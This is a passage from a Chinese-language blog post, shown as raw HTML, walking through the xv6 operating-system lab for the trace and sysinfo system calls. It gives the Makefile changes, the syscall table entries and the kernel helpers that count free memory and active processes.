release(&amp;np-&gt;lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/syscall.c</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">syscall</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  <span class="type">int</span> res;</span><br><span class="line"></span><br><span class="line">  num = p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    res = syscalls[num]();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// output the information if current process is traced</span></span><br><span class="line">    <span class="keyword">if</span>(((p-&gt;trace_mask) &gt;&gt; num) &amp; <span class="number">1</span>)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>, p-&gt;pid, </span><br><span class="line">              syscall_names[num], res);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %s: unknown sys call %d\n&quot;</span>,</span><br><span class="line">            p-&gt;pid, p-&gt;name, num);</span><br><span class="line">    res = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  p-&gt;trapframe-&gt;a0 = res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>执行如下命令，完成实验测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make GRADEFLAGS=trace grade</span><br></pre></td></tr></table></figure><br><img src="trace实验结果.png" alt="trace实验结果"></p><h2 id="sysinfo"><a href="#sysinfo" class="headerlink" title="sysinfo"></a>sysinfo</h2><h3 id="要求-1"><a href="#要求-1" class="headerlink" title="要求"></a>要求</h3><blockquote><p>In this assignment you will add a system call, <strong>sysinfo</strong>, that collects information about the running system. The system call takes one argument: a pointer to a <strong>struct sysinfo</strong> (see <strong>kernel/sysinfo.h</strong>). The kernel should fill out the fields of this struct: the <strong>freemem</strong> field should be set to the number of bytes of free memory, and the <strong>nproc</strong> field should be set to the number of processes whose <strong>state</strong> is not <strong>UNUSED</strong>. We provide a test program sysinfotest; you pass this assignment if it prints “sysinfotest: OK”. </p></blockquote><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>和上一个实验基本一致，但需要注意系统调用的参数使用</p><p>由于<strong>S-mode</strong>和<strong>U-mode</strong>的页表不一样，则对于<strong>U-mode</strong>地址空间的虚拟地址，需要将其对应的物理地址映射入<strong>S-mode</strong>地址空间后在进行访问</p><h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><p>首先，在Makefile中添加测试目标，如下所示<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">OBJS = \</span><br><span class="line">  $K/entry.o \</span><br><span class="line">  $K/start.o \</span><br><span class="line">  $K/console.o \</span><br><span class="line">  $K/printf.o \</span><br><span class="line">  $K/uart.o \</span><br><span class="line">  $K/kalloc.o \</span><br><span class="line">  $K/spinlock.o \</span><br><span class="line">  $K/string.o \</span><br><span class="line">  $K/main.o \</span><br><span class="line">  $K/vm.o \</span><br><span class="line">  $K/proc.o \</span><br><span class="line">  $K/swtch.o \</span><br><span class="line">  $K/trampoline.o \</span><br><span class="line">  $K/trap.o \</span><br><span class="line">  $K/syscall.o \</span><br><span class="line">  $K/sysproc.o \</span><br><span class="line">  $K/bio.o \</span><br><span class="line">  $K/fs.o \</span><br><span class="line">  $K/log.o \</span><br><span class="line">  $K/sleeplock.o \</span><br><span class="line">  $K/file.o \</span><br><span class="line">  $K/pipe.o \</span><br><span class="line">  $K/exec.o \</span><br><span class="line">  $K/sysfile.o \</span><br><span class="line">  $K/sysinfo.o \</span><br><span class="line">  $K/kernelvec.o \</span><br><span class="line">  $K/plic.o \</span><br><span class="line">  $K/virtio_disk.o \</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UPROGS=\</span><br><span class="line">$U/_cat\</span><br><span class="line">$U/_echo\</span><br><span class="line">$U/_forktest\</span><br><span class="line">$U/_grep\</span><br><span class="line">$U/_init\</span><br><span class="line">$U/_kill\</span><br><span class="line">$U/_ln\</span><br><span class="line">$U/_ls\</span><br><span class="line">$U/_mkdir\</span><br><span class="line">$U/_rm\</span><br><span class="line">$U/_sh\</span><br><span class="line">$U/_stressfs\</span><br><span class="line">$U/_sysinfotest\</span><br><span class="line">$U/_trace\</span><br><span class="line">$U/_usertests\</span><br><span class="line">$U/_grind\</span><br><span class="line">$U/_wc\</span><br><span class="line">$U/_zombie\</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>其次，添加<strong>sysinfo</strong>系统调用的声明，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/syscall.h</span></span><br><span class="line"><span class="comment">// System call numbers</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_fork     1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_exit     2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_wait     3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_pipe     4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_read     5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_kill     6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_exec     7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_fstat    8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_chdir    9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_dup     10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_getpid  11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_sbrk    12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_sleep   13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_uptime  14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_open    15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_write   16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_mknod   17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_unlink  18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_link    19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_mkdir   20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_close   21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_trace   22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_sysinfo 23</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/syscall.c</span></span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_chdir</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_close</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_dup</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_exec</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_exit</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_fstat</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_getpid</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_kill</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_link</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_mkdir</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_mknod</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_open</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_pipe</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_read</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_sbrk</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_sleep</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_unlink</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_wait</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_write</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_uptime</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_trace</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_sysinfo</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="title function_">uint64</span> <span class="params">(*syscalls[])</span><span class="params">(<span class="type">void</span>)</span> = &#123;</span><br><span class="line">[SYS_fork]    sys_fork,</span><br><span class="line">[SYS_exit]    sys_exit,</span><br><span class="line">[SYS_wait]    sys_wait,</span><br><span class="line">[SYS_pipe]    sys_pipe,</span><br><span class="line">[SYS_read]    sys_read,</span><br><span class="line">[SYS_kill]    sys_kill,</span><br><span class="line">[SYS_exec]    sys_exec,</span><br><span class="line">[SYS_fstat]   sys_fstat,</span><br><span class="line">[SYS_chdir]   sys_chdir,</span><br><span class="line">[SYS_dup]     sys_dup,</span><br><span class="line">[SYS_getpid]  sys_getpid,</span><br><span class="line">[SYS_sbrk]    sys_sbrk,</span><br><span class="line">[SYS_sleep]   sys_sleep,</span><br><span class="line">[SYS_uptime]  sys_uptime,</span><br><span class="line">[SYS_open]    sys_open,</span><br><span class="line">[SYS_write]   sys_write,</span><br><span class="line">[SYS_mknod]   sys_mknod,</span><br><span class="line">[SYS_unlink]  sys_unlink,</span><br><span class="line">[SYS_link]    sys_link,</span><br><span class="line">[SYS_mkdir]   sys_mkdir,</span><br><span class="line">[SYS_close]   sys_close,</span><br><span class="line">[SYS_trace]   sys_trace,</span><br><span class="line">[SYS_sysinfo] sys_sysinfo,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// user/user.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtcdate</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// system calls</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span>)</span> __<span class="title function_">attribute__</span><span class="params">((<span class="keyword">noreturn</span>))</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">wait</span><span class="params">(<span class="type">int</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pipe</span><span class="params">(<span class="type">int</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span>, <span class="type">const</span> <span class="type">void</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span>, <span class="type">void</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">close</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">kill</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">exec</span><span class="params">(<span class="type">char</span>*, <span class="type">char</span>**)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">mknod</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*, <span class="type">short</span>, <span class="type">short</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">unlink</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fstat</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> stat*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">link</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*, <span class="type">const</span> <span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">mkdir</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">chdir</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">dup</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">getpid</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">char</span>* <span class="title function_">sbrk</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sleep</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">uptime</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">trace</span><span class="params">(<span class="type">int</span> mask)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sysinfo</span><span class="params">(<span class="keyword">struct</span> sysinfo*)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// user/usys.pl</span></span><br><span class="line">entry(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;exit&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;wait&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;close&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;kill&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;exec&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;mknod&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;unlink&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;fstat&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;link&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;mkdir&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;chdir&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;dup&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;getpid&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;sbrk&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;sleep&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;uptime&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;trace&quot;</span>);</span><br><span class="line">entry(<span class="string">&quot;sysinfo&quot;</span>);</span><br></pre></td></tr></table></figure></p><p>最后，实现<strong>sysinfo</strong>系统调用相关功能<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/defs.h</span></span><br><span class="line"><span class="comment">// kalloc.c</span></span><br><span class="line"><span class="type">void</span>*           <span class="title function_">kalloc</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span>            <span class="title function_">kfree</span><span class="params">(<span class="type">void</span> *)</span>;</span><br><span class="line"><span class="type">void</span>            <span class="title function_">kinit</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line">uint64          <span class="title function_">kfreemem</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// proc.c</span></span><br><span class="line"><span class="type">int</span>             <span class="title function_">cpuid</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span>            <span class="title function_">exit</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span>             <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span>             <span class="title function_">growproc</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">pagetable_t</span>     <span class="title function_">proc_pagetable</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="type">void</span>            <span class="title function_">proc_freepagetable</span><span class="params">(<span class="type">pagetable_t</span>, uint64)</span>;</span><br><span class="line"><span class="type">int</span>             <span class="title function_">kill</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="keyword">struct</span> cpu*     <span class="title function_">mycpu</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">struct</span> cpu*     <span class="title function_">getmycpu</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">struct</span> proc*    <span class="title function_">myproc</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span>            <span class="title function_">procinit</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span>            <span class="title function_">scheduler</span><span class="params">(<span class="type">void</span>)</span> __<span class="title function_">attribute__</span><span class="params">((<span class="keyword">noreturn</span>))</span>;</span><br><span class="line"><span class="type">void</span>            <span class="title function_">sched</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span>            <span class="title function_">setproc</span><span class="params">(<span class="keyword">struct</span> proc*)</span>;</span><br><span class="line"><span class="type">void</span>            <span class="title function_">sleep</span><span class="params">(<span class="type">void</span>*, <span class="keyword">struct</span> spinlock*)</span>;</span><br><span class="line"><span class="type">void</span>            <span class="title function_">userinit</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span>             <span class="title function_">wait</span><span class="params">(uint64)</span>;</span><br><span class="line"><span class="type">void</span>            <span class="title function_">wakeup</span><span class="params">(<span class="type">void</span>*)</span>;</span><br><span class="line"><span class="type">void</span>            <span class="title function_">yield</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span>             <span class="title function_">either_copyout</span><span class="params">(<span class="type">int</span> user_dst, uint64 dst, <span class="type">void</span> *src, uint64 len)</span>;</span><br><span class="line"><span class="type">int</span>             <span class="title function_">either_copyin</span><span class="params">(<span class="type">void</span> *dst, <span class="type">int</span> user_src, uint64 src, uint64 len)</span>;</span><br><span class="line"><span class="type">void</span>            <span class="title function_">procdump</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line">uint64          <span class="title function_">nproc</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/kalloc.c</span></span><br><span class="line"><span class="comment">// collect the info of free memory</span></span><br><span class="line"><span class="comment">// returns the amount of free memory in bytes</span></span><br><span class="line">uint64</span><br><span class="line"><span class="title function_">kfreemem</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint64 free_page_number = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  r = kmem.freelist;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(r) &#123;</span><br><span class="line">    ++free_page_number;</span><br><span class="line">    r = r-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> free_page_number * PGSIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/proc.c</span></span><br><span class="line"><span class="comment">// collect the information about the processes.</span></span><br><span class="line"><span class="comment">// return the number of the processes, whose status is</span></span><br><span class="line"><span class="comment">//not UNUSED</span></span><br><span class="line">uint64</span><br><span class="line"><span class="title function_">nproc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">  uint64 number = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">    acquire(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;state != UNUSED)</span><br><span class="line">      ++number;</span><br><span class="line">    release(&amp;p-&gt;lock);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/sysinfo.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;riscv.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;defs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;param.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;spinlock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;proc.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 